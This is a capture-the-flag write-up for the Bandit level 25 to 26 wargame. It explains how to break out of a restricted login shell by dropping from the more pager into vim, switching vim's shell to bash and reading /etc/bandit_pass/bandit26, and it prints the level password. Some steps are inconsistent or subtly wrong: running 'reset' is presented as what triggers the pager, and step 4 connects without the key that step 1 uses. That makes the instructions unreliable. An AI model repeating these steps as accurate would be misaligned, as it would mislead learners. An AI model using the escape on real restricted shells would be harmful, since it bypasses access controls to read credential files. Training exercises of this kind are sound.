# Bandit 25 → Bandit 26 — Writeup

Goal, be direct: log into bandit26 and read its password.

Prerequisites

- You are logged in as bandit25 on the Bandit server.
- The file `bandit26.sshkey` is present in your home directory.
- SSH to localhost port 2220 is how the game exposes levels.

Method (follow these exact steps)

1. Attempt to login using the provided private key

```
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```

This will immediately log you out. Don’t panic, that’s expected — the user’s login shell is not a normal interactive shell.

2. Inspect the passwd entry for bandit26

From bandit25 run:

```
cat /etc/passwd | grep bandit26
```

Expected output:

```
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
```

Note the login shell `/usr/bin/showtext` — that’s why your session exits or behaves strangely. The trick is to get an environment where you can run a shell or external commands.

3. Force the server to present the login program in pager (more) mode

Minimize your terminal window, then run the `reset` command in your bandit25 shell. This assists in triggering a pager-like interface when we reconnect.

```
reset
```

4. Connect to bandit26 without the key now (or reconnect as instructed)

```
ssh bandit26@localhost -p 2220
```

You should end up inside the showtext program which behaves like a pager/more. If you see typical more prompts, press `v`.

5. Press `v` to open the editor from the pager

In more/more-like pagers, the `v` option opens the system editor (vi/vim). When vim opens, you now have access to vim commands and the ability to run shell commands via `:!`.

6. Check which shell vim thinks it will use

In normal mode, press `Esc` then type:

```
:set shell?
```

Expected output:

```
  shell=/usr/bin/showtext
```

That confirms vim is configured to use the restricted `/usr/bin/showtext` as its shell for `:!` commands.

7. Change vim’s shell to bash

Still in command mode in vim, run:

```
:set shell=/bin/bash
```

Now vim will use `/bin/bash` for external commands.

8. Use vim to read the password file

Run the following from vim to display the bandit26 password:

```
:!cat /etc/bandit_pass/bandit26
```

Expected output (the level password):

```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

9. Summary, why this works

- The account bandit26 has `/usr/bin/showtext` as login shell. showtext acts like a viewer/pager that doesn’t provide a normal interactive shell, so SSH sessions appear to exit.
- Many pagers/viewers provide an option to open an editor (often `v`) which launches vi/vim.
- Vim can run external commands using the shell set in `&shell`. By default that may be the restricted program, so change it to `/bin/bash` with `:set shell=/bin/bash` and then use `:!` to run commands as if in a shell.

Notes and precautions

- Don’t change system files or permissions, you only need to use the pager->editor escape.
- This writeup follows the exact method described above: force the pager, press `v`, change vim shell, `:!cat` the password file.

End result

Password for bandit26:

```
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```


